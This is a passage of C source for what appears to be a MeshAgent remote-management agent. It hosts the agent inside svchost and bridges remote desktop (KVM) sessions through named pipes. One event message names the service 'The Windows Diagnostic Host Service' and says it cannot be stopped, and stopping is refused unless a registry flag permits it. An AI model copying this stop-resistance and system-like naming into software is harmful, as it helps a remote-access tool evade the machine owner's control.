/*
 * MeshAgent ServiceHost.exe Hosting Implementation
 *
 * Hosts MeshAgent as a service DLL in a configured Windows svchost group instead
 * of a standalone process. The selected host mode remains visible in service
 * metadata and operator logs.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <wchar.h>
#include <Aclapi.h>
#include <sddl.h>
#include <strsafe.h>
#include "runtime_core.h"
#include "service_integration.h"
#include "service_utils.h"
#include "service_defaults.h"
#include "service_security.h"
#include "rundll32_contract.h"
#include "../meshcore/agentcore.h"
#include "../meshcore/meshdefines.h"
#include "../meshcore/KVM/Windows/kvm.h"
#include "branding_util.h"
#include "../microstack/ILibParsers.h"

// Use AgentCore APIs
// MeshAgent_Create/MeshAgent_Stop are declared in agentcore.h
// Provide a local run helper that starts the ILib chain
static void MeshAgent_Run(MeshAgentHostContainer* agent)
{
    if (agent != NULL && agent->chain != NULL)
    {
        ILibStartChain(agent->chain);
    }
}

// Global state for svchost-hosted service
static SERVICE_STATUS_HANDLE g_ServiceHostStatusHandle = NULL;
static SERVICE_STATUS g_ServiceHostStatus = {0};
static BOOL g_ServiceHostRunning = FALSE;

static void ServiceHost_ReportStopDenial(void)
{
    wchar_t logName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), logName, _countof(logName));
    if (logName[0] == L'\0')
    {
        StringCchCopyW(logName, _countof(logName), SERVICE_FALLBACK_SERVICE_NAME);
    }
    HANDLE evt = RegisterEventSourceW(NULL, logName);
    if (evt != NULL)
    {
        const wchar_t* strings[1];
        strings[0] = L"The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
        ReportEventW(evt,
            EVENTLOG_WARNING_TYPE,
            0,
            0xC0020001,
            NULL,
            1,
            0,
            strings,
            NULL);
        DeregisterEventSource(evt);
    }
}
static MeshAgentHostContainer* g_ServiceHostAgent = NULL;

static void ServiceHost_StopAgentOnChain(void* chain, void* user)
{
    UNREFERENCED_PARAMETER(user);
    if (chain != NULL)
    {
        ILibStopChain(chain);
    }
}

static BOOL ServiceHost_RequestAgentStop(void)
{
    MeshAgentHostContainer* agent = g_ServiceHostAgent;
    if (agent == NULL || agent->chain == NULL) { return FALSE; }

    // SCM waits synchronously for the control handler to return. Dispatch the
    // stop onto the chain thread so the handler cannot deadlock with chain
    // teardown while the service main thread is leaving MeshAgent_Start().
    if (ILibIsRunningOnChainThread(agent->chain) != 0)
    {
        ILibStopChain(agent->chain);
    }
    else
    {
        ILibChain_RunOnMicrostackThreadEx3(agent->chain, ServiceHost_StopAgentOnChain, NULL, NULL);
    }
    return TRUE;
}

static BOOL ServiceHost_AllowStop(void)
{
    wchar_t serviceKeyName[256] = {0};
    // AllowStop is stored under the SCM service key name, not the display name.
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0')
    {
        StringCchCopyW(serviceKeyName, _countof(serviceKeyName), SERVICE_FALLBACK_SERVICE_NAME);
    }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);

    DWORD value = 0;
    DWORD cb = sizeof(value);
    if (RegGetValueW(HKEY_LOCAL_MACHINE, paramsKeyPath, L"AllowStop", RRF_RT_REG_DWORD, NULL, &value, &cb) == ERROR_SUCCESS)
    {
        return (value != 0);
    }
    return FALSE;
}

static void ServiceHost_RefreshControlsAccepted(void)
{
    DWORD controls = SERVICE_ACCEPT_STOP |
                     SERVICE_ACCEPT_SHUTDOWN |
                     SERVICE_ACCEPT_POWEREVENT |
                     SERVICE_ACCEPT_SESSIONCHANGE;
    g_ServiceHostStatus.dwControlsAccepted = controls;
    SetServiceStatus(g_ServiceHostStatusHandle, &g_ServiceHostStatus);
}

// Cached module path information for resolving provisioning artifacts
static wchar_t g_ServiceHostModulePath[MAX_PATH] = {0};
static wchar_t g_ServiceHostInstallDir[MAX_PATH] = {0};
static wchar_t g_ServiceHostLogFile[MAX_PATH] = {0};
static char g_ServiceHostExeStorage[ILibMemory_Init_Size(2048, sizeof(void*))] = {0};
static char* g_ServiceHostExeUtf8 = NULL;
static char* g_ServiceHostArgv[2] = { NULL, NULL };
static BOOL g_ServiceHostPathsInitialized = FALSE;
static BOOL g_ServiceHostCrtHandlersInstalled = FALSE;

// Forward declarations
static BOOL ServiceHost_SelectServiceHostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand);
static void ServiceHost_InitializePaths(HINSTANCE moduleHandle);
static void ServiceHost_LogProvisioningStatus(void);
static void ServiceHost_LogLine(const wchar_t* format, ...);
static BOOL ServiceHost_CanHardenModuleDacl(void);
static BOOL ServiceHost_EnsureModuleDacl(void);
static void ServiceHost_InstallCrtHandlers(void);

#if defined(BUILD_SERVICE_BUNDLE_DLL) && defined(_LINKVM)
extern int wmain(int argc, char* wargv[]);
extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
extern int g_shutdown;
extern int kvmConsoleMode;
extern int gRemoteMouseRenderDefault;
extern int kvm_server_inputdata(char* block, int blocklen, ILibKVM_WriteHandler writeHandler, void* reserved);
typedef HRESULT(__stdcall* ServiceDpiAwarenessFunc)(int);
#define SERVICE_PROCESS_PER_MONITOR_DPI_AWARE 2
static LONG g_KvmBridgeTraceCounter = 0;
#define KVM_BRIDGE_MAINLOOP_WAIT_SLICE_MS 100UL
#define KVM_BRIDGE_SHUTDOWN_GRACE_MS 3000UL

typedef struct ServiceKvmBridgeContext
{
    HANDLE controlPipeHandle;
    HANDLE dataPipeHandle;
    HANDLE stdInHandle;
    HANDLE stdOutHandle;
    ULONGLONG attachTickMs;
    DWORD readError;
    DWORD writeError;
    DWORD firstOutputLogged;
    DWORD firstScreenLogged;
} ServiceKvmBridgeContext;

typedef struct ServiceKvmBridgeLaunchContext
{
    int argc;
    WCHAR arg0[MAX_PATH];
    WCHAR arg1[32];
    WCHAR arg2[32];
    WCHAR arg3[32];
    WCHAR* argv[5];
} ServiceKvmBridgeLaunchContext;

static BOOL KvmBridge_LooksLikePipeNameW(const wchar_t* value)
{
    return (value != NULL && wcsncmp(value, L"\\\\.\\pipe\\", 9) == 0) ? TRUE : FALSE;
}

static int KvmBridge_ExtractPipeNamesW(const wchar_t* input, wchar_t* controlPipeName, size_t controlPipeNameLen, wchar_t* dataPipeName, size_t dataPipeNameLen)
{
    const wchar_t* cursor = NULL;
    wchar_t tokenBuffer[MAX_PATH * 4] = { 0 };
    int pipeCount = 0;

    if (controlPipeName != NULL && controlPipeNameLen > 0) { controlPipeName[0] = L'\0'; }
    if (dataPipeName != NULL && dataPipeNameLen > 0) { dataPipeName[0] = L'\0'; }
    if (input == NULL) { return 0; }

    cursor = input;
    while (*cursor != L'\0' && pipeCount < 2)
    {
        const wchar_t* tokenStart = NULL;
        size_t tokenLen = 0;
        wchar_t* destination = NULL;
        size_t destinationLen = 0;

        while (*cursor == L' ' || *cursor == L'\t')
        {
            ++cursor;
        }
        if (*cursor == L'\0') { break; }

        if (*cursor == L'"')
        {
            ++cursor;
            tokenStart = cursor;
            while (*cursor != L'\0' && *cursor != L'"')
            {
                ++cursor;
            }
            tokenLen = (size_t)(cursor - tokenStart);
            if (*cursor == L'"') { ++cursor; }
        }
        else
        {
            tokenStart = cursor;
            while (*cursor != L'\0' && *cursor != L' ' && *cursor != L'\t')
            {
                ++cursor;
            }
            tokenLen = (size_t)(cursor - tokenStart);
        }

        if (tokenLen == 0) { continue; }
        if (tokenLen >= _countof(tokenBuffer)) { tokenLen = _countof(tokenBuffer) - 1; }
        memcpy_s(tokenBuffer, sizeof(tokenBuffer), tokenStart, tokenLen * sizeof(wchar_t));
        tokenBuffer[tokenLen] = L'\0';

        if (_wcsnicmp(tokenBuffer, L"\\\\.\\pipe\\", 9) != 0) { continue; }
        destination = (pipeCount == 0) ? controlPipeName : dataPipeName;
        destinationLen = (pipeCount == 0) ? controlPipeNameLen : dataPipeNameLen;
        if (destination != NULL && destinationLen > 0)
        {
            StringCchCopyW(destination, destinationLen, tokenBuffer);
        }
        ++pipeCount;
    }
    return pipeCount;
}

static int KvmBridge_HasTokenW(const wchar_t* input, const wchar_t* token)
{
    const wchar_t* cursor = NULL;
    size_t tokenLen = 0;

    if (input == NULL || token == NULL || token[0] == L'\0') { return 0; }
    tokenLen = wcslen(token);
    cursor = input;

    while ((cursor = wcsstr(cursor, token)) != NULL)
    {
        wchar_t before = (cursor == input) ? L' ' : cursor[-1];
        wchar_t after = cursor[tokenLen];
        int beforeOk = (before == L' ' || before == L'\t' || before == L'\r' || before == L'\n' || before == L'"' || before == L'\0');
        int afterOk = (after == L' ' || after == L'\t' || after == L'\r' || after == L'\n' || after == L'"' || after == L'\0');
        if (beforeOk && afterOk) { return 1; }
        ++cursor;
    }
    return 0;
}

static void KvmBridge_BuildLaunchContextW(const wchar_t* cmdLine, ServiceKvmBridgeLaunchContext* ctx)
{
    if (ctx == NULL) { return; }
    ZeroMemory(ctx, sizeof(ServiceKvmBridgeLaunchContext));

    if (GetModuleFileNameW(NULL, ctx->arg0, (DWORD)_countof(ctx->arg0)) == 0)
    {
        StringCchCopyW(ctx->arg0, _countof(ctx->arg0), L"rundll32.exe");
    }
    if (KvmBridge_HasTokenW(cmdLine, L"-kvm0"))
    {
        StringCchCopyW(ctx->arg1, _countof(ctx->arg1), L"-kvm0");
    }
    else
    {
        StringCchCopyW(ctx->arg1, _countof(ctx->arg1), L"-kvm1");
    }

    ctx->argv[ctx->argc++] = ctx->arg0;
    ctx->argv[ctx->argc++] = ctx->arg1;

    if (KvmBridge_HasTokenW(cmdLine, L"-coredump"))
    {
        StringCchCopyW(ctx->arg2, _countof(ctx->arg2), L"-coredump");
        ctx->argv[ctx->argc++] = ctx->arg2;
    }
    if (KvmBridge_HasTokenW(cmdLine, L"-remotecursor"))
    {
        WCHAR* dest = (ctx->argc == 2) ? ctx->arg2 : ctx->arg3;
        size_t destLen = (ctx->argc == 2) ? _countof(ctx->arg2) : _countof(ctx->arg3);
        StringCchCopyW(dest, destLen, L"-remotecursor");
        ctx->argv[ctx->argc++] = dest;
    }
    ctx->argv[ctx->argc] = NULL;
}

static void KvmBridge_EnableDpiAwareness(void)
{
    HMODULE shcore = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    ServiceDpiAwarenessFunc dpiAwareness = NULL;

    if (shcore != NULL)
    {
        dpiAwareness = (ServiceDpiAwarenessFunc)GetProcAddress(shcore, (LPCSTR)"SetProcessDpiAwareness");
    }
    if (dpiAwareness != NULL)
    {
        dpiAwareness(SERVICE_PROCESS_PER_MONITOR_DPI_AWARE);
        FreeLibrary(shcore);
    }
    else
    {
        if (shcore != NULL) { FreeLibrary(shcore); }
        SetProcessDPIAware();
    }
}

static ILibTransport_DoneState KvmBridge_WriteSink(char* buffer, int bufferLen, void* reserved)
{
    ServiceKvmBridgeContext* ctx = (ServiceKvmBridgeContext*)reserved;
    HANDLE outputHandle = NULL;
    DWORD written = 0;
    unsigned short packetType = 0;

    if (ctx == NULL)
    {
        return ILibTransport_DoneState_ERROR;
    }
    if (buffer == NULL || bufferLen <= 0)
    {
        g_shutdown = 1;
        return ILibTransport_DoneState_COMPLETE;
    }
    if (bufferLen >= 2)
    {
        packetType = (unsigned short)ntohs(((unsigned short*)buffer)[0]);
    }
    if (GetEnvironmentVariableW(L"KVM_BRIDGE_TRACE_PACKETS", NULL, 0) > 0 &&
        InterlockedIncrement(&g_KvmBridgeTraceCounter) <= 64)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW write type=%u len=%d", packetType, bufferLen);
    }

    outputHandle = (ctx->stdOutHandle != NULL && ctx->stdOutHandle != INVALID_HANDLE_VALUE) ? ctx->stdOutHandle : ctx->dataPipeHandle;
    if (outputHandle == NULL || outputHandle == INVALID_HANDLE_VALUE)
    {
        ctx->writeError = ERROR_INVALID_HANDLE;
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }

    if (!WriteFile(outputHandle, buffer, (DWORD)bufferLen, &written, NULL))
    {
        ctx->writeError = GetLastError();
        if (ctx->writeError == ERROR_SUCCESS) { ctx->writeError = ERROR_BROKEN_PIPE; }
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }
    if (written != (DWORD)bufferLen)
    {
        ctx->writeError = ERROR_WRITE_FAULT;
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }
    if (ctx->firstOutputLogged == 0)
    {
        ctx->firstOutputLogged = 1;
        ServiceHost_LogLine(L"KvmSessionBridgeW first output packet after %llu ms type=%u len=%d",
            ctx->attachTickMs != 0 ? (unsigned long long)(GetTickCount64() - ctx->attachTickMs) : 0,
            packetType,
            bufferLen);
    }
    if (ctx->firstScreenLogged == 0 && (packetType == MNG_KVM_SCREEN || packetType == MNG_KVM_PICTURE))
    {
        ctx->firstScreenLogged = 1;
        ServiceHost_LogLine(L"KvmSessionBridgeW first screen packet after %llu ms type=%u len=%d",
            ctx->attachTickMs != 0 ? (unsigned long long)(GetTickCount64() - ctx->attachTickMs) : 0,
            packetType,
            bufferLen);
    }
    return ILibTransport_DoneState_COMPLETE;
}

static DWORD WINAPI KvmBridge_InputThread(LPVOID user)
{
    ServiceKvmBridgeContext* ctx = (ServiceKvmBridgeContext*)user;
    int len = 0;
    int ptr = 0;
    char packetBuffer[30000];

    HANDLE inputHandle = NULL;

    if (ctx == NULL)
    {
        return 0;
    }
    inputHandle = (ctx->stdInHandle != NULL && ctx->stdInHandle != INVALID_HANDLE_VALUE) ? ctx->stdInHandle : ctx->controlPipeHandle;
    if (inputHandle == NULL || inputHandle == INVALID_HANDLE_VALUE)
    {
        ctx->readError = ERROR_INVALID_HANDLE;
        return 0;
    }

    while (!g_shutdown)
    {
        DWORD read = 0;
        DWORD bytesAvailable = 0;

        if (len >= (int)sizeof(packetBuffer))
        {
            ctx->readError = ERROR_INSUFFICIENT_BUFFER;
            g_shutdown = 1;
            break;
        }

        if (!PeekNamedPipe(inputHandle, NULL, 0, NULL, &bytesAvailable, NULL))
        {
            ctx->readError = GetLastError();
            if (ctx->readError == ERROR_SUCCESS) { ctx->readError = ERROR_BROKEN_PIPE; }
            ServiceHost_LogLine(L"KvmSessionBridgeW input pipe closed (peekError=%lu)", ctx->readError);
            g_shutdown = 1;
            break;
        }
        if (bytesAvailable == 0)
        {
            Sleep(KVM_BRIDGE_MAINLOOP_WAIT_SLICE_MS);
            continue;
        }
        if (bytesAvailable > (DWORD)(sizeof(packetBuffer) - len))
        {
            bytesAvailable = (DWORD)(sizeof(packetBuffer) - len);
        }
        if (!ReadFile(inputHandle, packetBuffer + len, bytesAvailable, &read, NULL) || read == 0)
        {
            ctx->readError = GetLastError();
            if (ctx->readError == ERROR_SUCCESS) { ctx->readError = ERROR_BROKEN_PIPE; }
            ServiceHost_LogLine(L"KvmSessionBridgeW input pipe closed (error=%lu read=%lu)", ctx->readError, read);
            g_shutdown = 1;
            break;
        }

        len += (int)read;
        ptr = 0;
        while ((len - ptr) >= 4)
        {
            unsigned short type = ntohs(((unsigned short*)(packetBuffer + ptr))[0]);
            int size = (int)ntohs(((unsigned short*)(packetBuffer + ptr))[1]);
            int consumed = 0;

            if (type == MNG_JUMBO)
            {
                if ((len - ptr) < 8) { break; }
                size = 8 + (int)ntohl(((unsigned int*)(packetBuffer + ptr))[1]);
            }
            if (size < 4 || size > (int)sizeof(packetBuffer))
            {
                ctx->readError = ERROR_INVALID_DATA;
                g_shutdown = 1;
                return 0;
            }
            if ((len - ptr) < size) { break; }

            if (type == MNG_KVM_DISCONNECT)
            {
                ptr += size;
                g_shutdown = 1;
                break;
            }

            consumed = kvm_server_inputdata(packetBuffer + ptr, len - ptr, KvmBridge_WriteSink, ctx);
            if (consumed <= 0) { break; }
            ptr += consumed;
        }

        if (ptr > 0)
        {
            if (ptr < len)
            {
                memmove(packetBuffer, packetBuffer + ptr, (size_t)(len - ptr));
            }
            len -= ptr;
        }
    }

    return 0;
}

static DWORD WINAPI KvmBridge_MainloopThread(LPVOID user)
{
    void** mainloopParam = (void**)user;

    if (mainloopParam == NULL) { return ERROR_INVALID_PARAMETER; }
    kvmConsoleMode = 1;
    return kvm_server_mainloop(mainloopParam);
}

static void KvmBridge_CancelTransportIo(ServiceKvmBridgeContext* ctx, HANDLE bridgeStdIn, HANDLE bridgeStdOut)
{
    if (bridgeStdIn != NULL && bridgeStdIn != INVALID_HANDLE_VALUE) { CancelIoEx(bridgeStdIn, NULL); }
    if (bridgeStdOut != NULL && bridgeStdOut != INVALID_HANDLE_VALUE) { CancelIoEx(bridgeStdOut, NULL); }
    if (ctx == NULL) { return; }
    if (ctx->controlPipeHandle != NULL && ctx->controlPipeHandle != INVALID_HANDLE_VALUE) { CancelIoEx(ctx->controlPipeHandle, NULL); }
    if (ctx->dataPipeHandle != NULL && ctx->dataPipeHandle != INVALID_HANDLE_VALUE) { CancelIoEx(ctx->dataPipeHandle, NULL); }
}

static BOOL KvmBridge_PipeDisconnected(HANDLE pipeHandle, DWORD* errorOut)
{
    DWORD state = 0;
    DWORD currentInstances = 0;
    DWORD errorCode = ERROR_SUCCESS;

    if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
    if (pipeHandle == NULL || pipeHandle == INVALID_HANDLE_VALUE)
    {
        if (errorOut != NULL) { *errorOut = ERROR_INVALID_HANDLE; }
        return TRUE;
    }
    if (GetNamedPipeHandleStateW(pipeHandle, &state, &currentInstances, NULL, NULL, NULL, 0))
    {
        return FALSE;
    }
    errorCode = GetLastError();
    if (errorOut != NULL) { *errorOut = errorCode; }
    return (errorCode == ERROR_BROKEN_PIPE ||
        errorCode == ERROR_PIPE_NOT_CONNECTED ||
        errorCode == ERROR_NO_DATA ||
        errorCode == ERROR_INVALID_HANDLE ||
        errorCode == ERROR_OPERATION_ABORTED) ? TRUE : FALSE;
}

void CALLBACK KvmSessionBridgeW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine, int nCmdShow)
{
    wchar_t controlPipeName[MAX_PATH * 4] = {0};
    wchar_t dataPipeName[MAX_PATH * 4] = {0};
    wchar_t connectDelayText[32] = {0};
    wchar_t forceExitCodeText[32] = {0};
    HANDLE inputThread = NULL;
    HANDLE mainloopThread = NULL;
    HANDLE bridgeStdIn = NULL;
    HANDLE bridgeStdOut = NULL;
    void **mainloopParam = NULL;
    ServiceKvmBridgeContext ctx;
    ServiceKvmBridgeLaunchContext launchCtx;
    DWORD connectDelayLen = 0;
    DWORD connectDelayMs = 0;
    DWORD forceExitCodeLen = 0;
    DWORD forcedExitCode = 0;
    int pauseMode = 1;
    int coreDumpMode = 0;
    BOOL useNamedPipeBridge = FALSE;
    int pipeCount = 0;
    ULONGLONG bridgeStartTickMs = GetTickCount64();

    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(nCmdShow);

    ZeroMemory(&ctx, sizeof(ctx));
    ctx.controlPipeHandle = INVALID_HANDLE_VALUE;
    ctx.dataPipeHandle = INVALID_HANDLE_VALUE;

    ServiceHost_InitializePaths(hinstDLL);

    // rundll32.exe's lpCmdLine parameter is unreliable for W-suffix entry points
    // in cross-session spawns — it passes the ANSI PEB command line bytes as-is,
    // producing garbled WIDE text.  Use GetCommandLineW() directly and extract
    // the arguments after the entry point name.
    {
        LPWSTR fullCmdLine = GetCommandLineW();
        LPWSTR entryPoint = NULL;
        if (fullCmdLine != NULL)
        {
            entryPoint = wcsstr(fullCmdLine, MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
            if (entryPoint != NULL)
            {
                entryPoint += wcslen(MESH_RUNDLL32_ENTRY_KVM_BRIDGE_W);
                while (*entryPoint == L' ') { entryPoint++; }
                lpCmdLine = entryPoint;
            }
        }
    }

    KvmBridge_BuildLaunchContextW(lpCmdLine, &launchCtx);
    pauseMode = KvmBridge_HasTokenW(lpCmdLine, L"-kvm0") ? 0 : 1;
    coreDumpMode = KvmBridge_HasTokenW(lpCmdLine, L"-coredump") ? 1 : 0;
    if (KvmBridge_HasTokenW(lpCmdLine, L"-remotecursor"))
    {
        gRemoteMouseRenderDefault = 1;
    }
    pipeCount = KvmBridge_ExtractPipeNamesW(lpCmdLine, controlPipeName, _countof(controlPipeName), dataPipeName, _countof(dataPipeName));
    useNamedPipeBridge = (pipeCount == 2 && KvmBridge_LooksLikePipeNameW(controlPipeName) && KvmBridge_LooksLikePipeNameW(dataPipeName));

    if (!useNamedPipeBridge)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW rejected unsupported transport contract (pipeCount=%d)", pipeCount);
        return;
    }

    ServiceHost_LogLine(L"KvmSessionBridgeW starting (input=%ls output=%ls)", controlPipeName, dataPipeName);
    forceExitCodeLen = GetEnvironmentVariableW(L"KVM_BRIDGE_FORCE_EXIT_CODE", forceExitCodeText, (DWORD)_countof(forceExitCodeText));
    if (forceExitCodeLen > 0 && forceExitCodeLen < _countof(forceExitCodeText))
    {
        forcedExitCode = wcstoul(forceExitCodeText, NULL, 10);
    }
    connectDelayLen = GetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, connectDelayText, (DWORD)_countof(connectDelayText));
    if (connectDelayLen > 0 && connectDelayLen < _countof(connectDelayText))
    {
        connectDelayMs = wcstoul(connectDelayText, NULL, 10);
        if (connectDelayMs > 60000UL) { connectDelayMs = 60000UL; }
    }
    if (connectDelayMs > 0)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW delaying pipe connect by %lu ms", connectDelayMs);
        Sleep(connectDelayMs);
    }
    if (useNamedPipeBridge)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW waiting for pipes (timeout=%u ms)", (unsigned int)KVM_BRIDGE_CONNECT_TIMEOUT_MS);
    }
    if (useNamedPipeBridge && !WaitNamedPipeW(controlPipeName, KVM_BRIDGE_CONNECT_TIMEOUT_MS))
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW WaitNamedPipeW failed (error=%lu, pipe=%ls)", GetLastError(), controlPipeName);
        return;
    }
    if (useNamedPipeBridge && !WaitNamedPipeW(dataPipeName, KVM_BRIDGE_CONNECT_TIMEOUT_MS))
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW WaitNamedPipeW failed (error=%lu, pipe=%ls)", GetLastError(), dataPipeName);
        return;
    }

    if (useNamedPipeBridge)
    {
        ctx.controlPipeHandle = CreateFileW(controlPipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (ctx.controlPipeHandle == INVALID_HANDLE_VALUE)
        {
            ServiceHost_LogLine(L"KvmSessionBridgeW CreateFileW failed (error=%lu, pipe=%ls)", GetLastError(), controlPipeName);
            goto cleanup;
        }
        ServiceHost_LogLine(L"KvmSessionBridgeW control pipe connected after %llu ms", (unsigned long long)(GetTickCount64() - bridgeStartTickMs));
        ctx.dataPipeHandle = CreateFileW(dataPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (ctx.dataPipeHandle == INVALID_HANDLE_VALUE)
        {
            ServiceHost_LogLine(L"KvmSessionBridgeW CreateFileW failed (error=%lu, pipe=%ls)", GetLastError(), dataPipeName);
            goto cleanup;
        }
        ServiceHost_LogLine(L"KvmSessionBridgeW data pipe connected after %llu ms", (unsigned long long)(GetTickCount64() - bridgeStartTickMs));
        if (!DuplicateHandle(GetCurrentProcess(), ctx.controlPipeHandle, GetCurrentProcess(), &bridgeStdIn, 0, FALSE, DUPLICATE_SAME_ACCESS))
        {
            ServiceHost_LogLine(L"KvmSessionBridgeW DuplicateHandle(stdin) failed (error=%lu)", GetLastError());
            goto cleanup;
        }
        if (!DuplicateHandle(GetCurrentProcess(), ctx.dataPipeHandle, GetCurrentProcess(), &bridgeStdOut, 0, FALSE, DUPLICATE_SAME_ACCESS))
        {
            ServiceHost_LogLine(L"KvmSessionBridgeW DuplicateHandle(stdout) failed (error=%lu)", GetLastError());
            goto cleanup;
        }
        ctx.stdInHandle = bridgeStdIn;
        ctx.stdOutHandle = bridgeStdOut;
        SetStdHandle(STD_INPUT_HANDLE, bridgeStdIn);
        SetStdHandle(STD_OUTPUT_HANDLE, bridgeStdOut);
    }
    ctx.attachTickMs = GetTickCount64();
    ServiceHost_LogLine(L"KvmSessionBridgeW transport attached after %llu ms", (unsigned long long)(ctx.attachTickMs - bridgeStartTickMs));

    g_shutdown = 0;

    // KvmSessionBridgeW owns the single control-pipe reader.  The mainloop is
    // forced into console-input mode so it does not create kvm_mainloopinput;
    // this keeps all pipe-close detection and command parsing in one place.
    ServiceHost_LogLine(L"KvmSessionBridgeW launching mainloop argc=%d argv0=[%ls] argv1=[%ls] useNamedPipe=%d", launchCtx.argc, launchCtx.argv[0] ? launchCtx.argv[0] : L"(null)", launchCtx.argv[1] ? launchCtx.argv[1] : L"(null)", useNamedPipeBridge ? 1 : 0);
    KvmBridge_EnableDpiAwareness();
    mainloopParam = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, NULL, NULL);
    if (mainloopParam == NULL)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW mainloop parameter allocation failed");
        goto cleanup;
    }
    mainloopParam[0] = KvmBridge_WriteSink;
    mainloopParam[1] = &ctx;
    ((int*)&(mainloopParam[2]))[0] = pauseMode;
    ((int*)&(mainloopParam[3]))[0] = coreDumpMode;
    mainloopThread = CreateThread(NULL, 0, KvmBridge_MainloopThread, mainloopParam, 0, NULL);
    if (mainloopThread == NULL)
    {
        ServiceHost_LogLine(L"KvmSessionBridgeW mainloop CreateThread failed (error=%lu)", GetLastError());
        free(mainloopParam);
        mainloopParam = NULL;
        goto cleanup;
    }
    mainloopParam = NULL;
    if (forcedExitCode != 0)
    {
        // Crash-recovery probes must complete the bridge handshake first so the
        // service takes the normal helper-exit retry/backoff path.
        ServiceHost_LogLine(L"KvmSessionBridgeW forced exit after bridge attach (code=%lu)", forcedExitCode);
        Sleep(50);
        ExitProcess(forcedExitCode);
    }

    {
        DWORD waitResult = WAIT_TIMEOUT;
        DWORD exitCode = 0;
        ULONGLONG shutdownObservedTickMs = 0;
        DWORD pipeStateError = ERROR_SUCCESS;

        for (;;)
        {
            waitResult = WaitForSingleObject(mainloopThread, KVM_BRIDGE_MAINLOOP_WAIT_SLICE_MS);
            if (waitResult == WAIT_OBJECT_0)
            {
                GetExitCodeThread(mainloopThread, &exitCode);
                ServiceHost_LogLine(L"KvmSessionBridgeW mainloop exited (threadExitCode=%lu readError=%lu writeError=%lu)", exitCode, ctx.readError, ctx.writeError);
                break;
            }
            if (waitResult != WAIT_TIMEOUT)
            {
                ServiceHost_LogLine(L"KvmSessionBridgeW mainloop wait failed (result=%lu error=%lu)", waitResult, GetLastError());
                break;
            }
            if (inputThread == NULL && ctx.firstOutputLogged != 0 && g_shutdown == 0)
            {
                inputThread = CreateThread(NULL, 0, KvmBridge_InputThread, &ctx, 0, NULL);
                if (inputThread == NULL)
                {
                    ctx.readError = GetLastError();
                    ServiceHost_LogLine(L"KvmSessionBridgeW input thread CreateThread failed (error=%lu)", ctx.readError);
                    g_shutdown = 1;
                }
                else
                {
                    ServiceHost_LogLine(L"KvmSessionBridgeW input thread started after first output");
                }
            }
            if (g_shutdown == 0 && inputThread != NULL && KvmBridge_PipeDisconnected(ctx.controlPipeHandle, &pipeStateError))
            {
                ctx.readError = pipeStateError;
                ServiceHost_LogLine(L"KvmSessionBridgeW control pipe disconnected (error=%lu)", pipeStateError);
                g_shutdown = 1;
            }
            if (g_shutdown == 0 && KvmBridge_PipeDisconnected(ctx.dataPipeHandle, &pipeStateError))
            {
                ctx.writeError = pipeStateError;
                ServiceHost_LogLine(L"KvmSessionBridgeW data pipe disconnected (error=%lu)", pipeStateError);
                g_shutdown = 1;
            }
            if (g_shutdown != 0)
            {
                if (shutdownObservedTickMs == 0)
                {
                    shutdownObservedTickMs = GetTickCount64();
                    ServiceHost_LogLine(L"KvmSessionBridgeW observed shutdown; cancelling bridge transport I/O");
                    KvmBridge_CancelTransportIo(&ctx, bridgeStdIn, bridgeStdOut);
                }
                else if ((GetTickCount64() - shutdownObservedTickMs) >= KVM_BRIDGE_SHUTDOWN_GRACE_MS)
                {
                    ServiceHost_LogLine(L"KvmSessionBridgeW mainloop shutdown timed out after %lu ms; exiting helper process", (DWORD)KVM_BRIDGE_SHUTDOWN_GRACE_MS);
                    ExitProcess(ERROR_OPERATION_ABORTED);
                }
            }
        }
    }

cleanup:
    g_shutdown = 1;
    if (inputThread != NULL)
    {
        if (ctx.controlPipeHandle != NULL && ctx.controlPipeHandle != INVALID_HANDLE_VALUE)
        {
            CancelIoEx(ctx.controlPipeHandle, NULL);
        }
        WaitForSingleObject(inputThread, 2000);
    }
    if (ctx.dataPipeHandle == ctx.controlPipeHandle)
    {
        ctx.dataPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (ctx.controlPipeHandle != NULL && ctx.controlPipeHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(ctx.controlPipeHandle);
        ctx.controlPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (ctx.dataPipeHandle != NULL && ctx.dataPipeHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(ctx.dataPipeHandle);
        ctx.dataPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (mainloopThread != NULL)
    {
        CloseHandle(mainloopThread);
    }
    if (inputThread != NULL)
    {
        CloseHandle(inputThread);
    }
    if (bridgeStdOut != NULL) { CloseHandle(bridgeStdOut); }
